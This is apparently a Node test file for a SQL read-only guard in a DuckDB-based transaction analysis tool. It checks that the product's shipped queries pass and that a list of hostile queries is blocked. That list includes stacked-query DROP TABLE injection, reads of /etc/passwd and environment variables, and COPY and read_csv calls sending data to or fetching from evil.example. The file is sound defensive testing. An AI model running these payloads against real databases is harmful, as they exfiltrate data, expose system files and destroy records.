// Run:  node --experimental-strip-types server/sqlguard.test.mjs   (npm run test:sqlguard)
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { sqlReadOnlyError } from "../src/utils/sqlGuard.ts";

// every query the product itself ships must pass: saved queries in SqlView + benchmark suite + traceback SQL
const view = readFileSync(new URL("../src/views/SqlView.tsx", import.meta.url), "utf8");
const duck = readFileSync(new URL("../src/engine/duckdb.ts", import.meta.url), "utf8");
const shipped = [...view.matchAll(/sql: "((?:[^"\\]|\\.)*)"/g), ...duck.matchAll(/sql: "((?:[^"\\]|\\.)*)"/g)].map((m) => JSON.parse('"' + m[1] + '"'));
const defaultSql = JSON.parse('"' + /useState\("((?:[^"\\]|\\.)*)"\)/.exec(view)[1] + '"');
shipped.push(defaultSql);
assert.ok(shipped.length >= 8, "found " + shipped.length);
for (const q of shipped) assert.equal(sqlReadOnlyError(q), null, q.slice(0, 60));
// tracebackSql() and the UNION'd traceback select
assert.equal(sqlReadOnlyError("WITH v AS (SELECT 'A' AS acc), h1 AS (SELECT 1 AS hop FROM txns QUALIFY row_number() OVER (PARTITION BY sender ORDER BY amount DESC) <= 25) SELECT * FROM h1"), null);
assert.equal(sqlReadOnlyError("SELECT * FROM tb_e1 UNION ALL SELECT * FROM tb_e2 ORDER BY hop, ts"), null);
assert.equal(sqlReadOnlyError("SELECT replace(sender, ',', '') AS s, 'a;b' AS lit, \"weird name\" FROM txns -- trailing; comment"), null);
assert.equal(sqlReadOnlyError("SELECT 1;"), null);

const evil = [
  "COPY txns TO 'out.csv'", "COPY (SELECT * FROM txns) TO 'https://evil.example/x'", "ATTACH 'x.db'", "INSTALL httpfs", "LOAD httpfs", "PRAGMA enable_logging",
  "SET enable_external_access=true", "DROP TABLE txns", "DELETE FROM txns", "INSERT INTO txns VALUES (1)", "CREATE TABLE x AS SELECT 1", "UPDATE txns SET amount=0",
  "SELECT 1; DROP TABLE txns", "SELECT 1; SELECT 2", "SELECT * FROM read_csv('https://evil.example/x.csv')", "SELECT * FROM read_text('/etc/passwd')",
  "SELECT * FROM 'https://evil.example/x.csv'", "SELECT * FROM \"/etc/passwd\"", "SELECT * FROM txns JOIN 'local.csv' ON true", "SELECT * FROM parquet_scan('x')",
  "SELECT * FROM duckdb_settings()", "SELECT * FROM glob('/*')", "SELECT getenv('HOME')", "WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x", "/* hi */ DROP TABLE txns",
  "SELECT 1 /* unterminated", "SELECT 'unterminated", "EXPORT DATABASE 'x'", "CALL pragma_version()", "SELECT * FROM query_table('txns')", "SELECT query('DROP TABLE txns')",
  "SELECT * FROM http_get('x')", "", "   ", "SELECT 1\u0000; DROP TABLE txns", "$$ DROP $$; SELECT 1", "SELECT * FROM txns; -- ok\nDROP TABLE txns",
];
for (const q of evil) assert.notEqual(sqlReadOnlyError(q), null, "should block: " + JSON.stringify(q));
// keywords inside literals / quoted identifiers must not cause false positives
assert.equal(sqlReadOnlyError("SELECT * FROM txns WHERE narration LIKE '%drop table%' AND mode <> 'COPY'"), null);
console.log(`sql guard: ${shipped.length} shipped queries allowed, ${evil.length} attacks blocked`);
